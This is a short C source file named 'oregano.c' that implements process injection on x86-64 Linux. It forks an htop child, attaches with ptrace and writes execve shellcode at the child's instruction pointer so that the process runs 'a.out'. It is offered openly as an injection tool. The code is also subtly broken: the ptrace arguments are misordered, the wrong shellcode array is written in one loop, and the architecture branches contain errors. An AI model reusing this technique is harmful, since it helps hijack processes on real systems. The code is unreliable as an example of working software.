// oregano.c
// https://github.com/R-Rothrock/oregano

#define _GNU_SOURCE

static char process_pathname[] = "a.out";
static char *process_argv[] = {&process_pathname, 0};
static char *process_envp[] = {0};

#include<stdlib.h>
#include<sys/ptrace.h> /* ptrace() */
#include<sys/reg.h> /* EIP, RIP */
#include<sys/stat.h> /* struct stat, stat() */
#include<sys/types.h> /* pid_t */
#include<sys/wait.h> /* waitpid() */
#include<unistd.h>

#if defined(__x86_64) // amd64
  #define OFFSET -1
  #define IP_REG RIP
  #define PTR_T u_int64_t

  static u_int8_t shellcode1[] = {0x48, 0xb8};
  static u_int8_t shellcode2[] = {0x99, 0x50, 0x54, 0x5f, 0x52, 0x5e, 0x6a, 0x3b, 0x59, 0x0f, 0x05};

//#elif defined(__i836) // amd32
//  #define OFFSET -1
//  #define IP_REG EIP
//  #define PTR_T u_int32_t

//#elif defined(__aarch64__) // arm64
//  #define OFFSET 1
//  #define IP_REG RIP
//  #define PTR_T u_int64_t

//#elif defined(__arm__) // arm32
//  #define OFFSET 1
//  #define IP_REG EIP
//  #define PTR_T u_int32_t

#else
  #error unsupported architecture
#endif

unsigned int get_file_size(char *pathname)
{
  struct stat stats;
  stat(pathname, &stats);
  return stats.st_size;
}

void child()
{
  char *child_argv[] = {"/usr/bin/htop", 0};
  char *child_envp[] = {0};
  exit(execve(child_argv[0], child_argv, child_envp));
}

void attach(pid_t pid)
{
  int _;
  ptrace(PTRACE_ATTACH, pid);
  waitpid(pid, &_, 0);
}

PTR_T get_ip_reg(pid_t pid)
{
  long ret = ptrace(PTRACE_PEEKUSER, pid, sizeof(long) * IP_REG);
  return (PTR_T) (ret + OFFSET);
}

int main(int argc, char *argv[])
{
  pid_t pid = fork();

  if(pid == 0)
  {
    child();
  }
  else if(pid < 0)
  {
    return -1;
  }

  attach(pid);

  PTR_T ip = get_ip_reg(pid);

  for(int i = 0; i < sizeof(shellcode1); i++)
  {
    ptrace(PTRACE_POKETEXT, shellcode1[i], ip);
    ip++;
  }

  for(int i = 0; i < sizeof(process_pathname); i++)
  {
    ptrace(PTRACE_POKETEXT, process_pathname[i], ip);
    ip++;
  }

  for(int i = 0; i < sizeof(shellcode2); i++)
  {
    ptrace(PTRACE_POKETEXT, shellcode1[i], ip);
    ip++;
  }

  ptrace(PTRACE_DETACH, 0, 0);

  return 0;
}
